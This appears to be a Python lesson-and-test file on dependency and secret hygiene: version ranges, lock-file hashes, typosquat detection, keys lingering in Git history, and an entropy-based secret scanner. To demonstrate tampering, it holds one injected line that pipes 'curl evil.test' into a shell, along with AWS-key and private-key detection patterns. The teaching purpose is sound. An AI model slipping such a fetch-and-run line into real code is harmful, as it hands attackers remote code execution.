"""Lesson 11: dependencies and secrets.

Asserts what a version range resolves to (and that a lock file with a hash refuses a swapped file), what a typosquatted name looks like
next to the real one, how a secret in a Git commit stays in history after the file is deleted (real git, throwaway repo), and that a small
scanner finds a key by its shape and by its entropy and does not flag ordinary words. All keys here are made up (AKIA...EXAMPLE style).
"""

import hashlib
import math
import re
import subprocess
import sys
import tempfile
from collections import Counter
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from seclab import check, done, show  # noqa: E402

# ---- 1. a version range is a promise about the future ----
AVAILABLE = ["1.2.0", "1.2.3", "1.3.0", "1.9.9", "2.0.0"]


def v(s: str) -> tuple[int, ...]:
    return tuple(int(x) for x in s.split("."))


def caret(spec: str) -> str:  # ^1.2.0 means >=1.2.0 and <2.0.0
    low = v(spec.lstrip("^"))
    return max((a for a in AVAILABLE if low <= v(a) < (low[0] + 1, 0, 0)), key=v)


def tilde(spec: str) -> str:  # ~1.2.0 means >=1.2.0 and <1.3.0
    low = v(spec.lstrip("~"))
    return max((a for a in AVAILABLE if low <= v(a) < (low[0], low[1] + 1, 0)), key=v)


check("^1.2.0 picks the newest 1.x: 1.9.9", caret("^1.2.0") == "1.9.9")
check("~1.2.0 picks the newest 1.2.x: 1.2.3", tilde("~1.2.0") == "1.2.3")
AVAILABLE.append("1.9.10")
check("next week the same ^1.2.0 gives 1.9.10: a build without a lock file is not the same build twice", caret("^1.2.0") == "1.9.10")

# ---- 2. a lock file with hashes ----
package = b"def pay(): return 'ok'\n"
lock = {"shop-utils==1.2.3": hashlib.sha256(package).hexdigest()}
swapped = package + b"import os; os.system('curl evil.test | sh')\n"
check("the file we locked matches its recorded sha256", hashlib.sha256(package).hexdigest() == lock["shop-utils==1.2.3"])
check("a file with one line added no longer matches, so the installer stops", hashlib.sha256(swapped).hexdigest() != lock["shop-utils==1.2.3"])

# ---- 3. names that look right ----
def edit_distance(a: str, b: str) -> int:
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        cur = [i]
        for j, cb in enumerate(b, 1):
            cur.append(min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (ca != cb)))
        prev = cur
    return prev[-1]


POPULAR = ["requests", "numpy", "cryptography", "urllib3", "pydantic"]


def suspicious(name: str) -> list[str]:
    return [p for p in POPULAR if name != p and edit_distance(name, p) <= 2]


show("names one or two letters from a popular package", {n: suspicious(n) for n in ["reqeusts", "numpyy", "pydantlc", "flask", "requests"]})
check("reqeusts, numpyy and pydantlc are each within 2 edits of a popular name", all(suspicious(n) for n in ["reqeusts", "numpyy", "pydantlc"]))
check("an unrelated name and the real name are not flagged", not suspicious("flask") and not suspicious("requests"))

# ---- 4. a secret in Git does not go away when the file does ----
repo = Path(tempfile.mkdtemp(prefix="appsec-secret-"))


def git(*args: str) -> str:
    return subprocess.run(["git", "-c", "user.name=Ada", "-c", "user.email=ada@example.com", "-c", "init.defaultBranch=main", *args], cwd=repo, capture_output=True, text=True, check=True).stdout


FAKE_KEY = "AKIAIOSFODNN7EXAMPLE"
git("init", "-q")
(repo / "config.py").write_text(f'AWS_KEY = "{FAKE_KEY}"\n')
git("add", ".")
git("commit", "-q", "-m", "add config")
(repo / "config.py").write_text('import os\nAWS_KEY = os.environ["AWS_KEY"]\n')
git("commit", "-qam", "move the key to the environment")
check("the file in the working folder no longer holds the key", FAKE_KEY not in (repo / "config.py").read_text())
first = git("rev-list", "--max-parents=0", "HEAD").strip()
check("the first commit still holds it, and anyone with a clone can read it", FAKE_KEY in git("show", f"{first}:config.py"))
check("git log -S finds the commit that added the key", "add config" in git("log", "-S" + FAKE_KEY, "--format=%s"))

# ---- 5. a scanner: by shape and by entropy ----
def entropy(s: str) -> float:
    counts = Counter(s)
    return -sum(c / len(s) * math.log2(c / len(s)) for c in counts.values())


SHAPES = {"aws access key id": re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "private key block": re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")}


def scan(text: str) -> list[str]:
    hits = [name for name, rx in SHAPES.items() if rx.search(text)]
    for token in re.findall(r"[A-Za-z0-9+/=_-]{24,}", text):
        if entropy(token) > 4.0 and not token.isalpha():
            hits.append("high entropy string")
    return hits


sample = f'KEY = "{FAKE_KEY}"\nTOKEN = "x7Kp9Qv2LmZr8TnYb4WcJd3HfGs6AeUo"\nname = "a_perfectly_ordinary_long_name_here"\n'
hits = scan(sample)
show("scanner on three lines", hits)
check("the shape rule finds the AWS style key id", "aws access key id" in hits)
check("the entropy rule finds the random looking token", "high entropy string" in hits)
check("the ordinary long name is not flagged (its entropy is below 4.0 bits per character)", entropy("a_perfectly_ordinary_long_name_here") < 4.0)
check("exactly two things were flagged in the sample", len(hits) == 2)
show("entropy in bits per character", {"random token": round(entropy("x7Kp9Qv2LmZr8TnYb4WcJd3HfGs6AeUo"), 2), "ordinary name": round(entropy("a_perfectly_ordinary_long_name_here"), 2)})
check("the random 32 character token has more entropy per character than the ordinary name", entropy("x7Kp9Qv2LmZr8TnYb4WcJd3HfGs6AeUo") > entropy("a_perfectly_ordinary_long_name_here") + 0.8)
done()
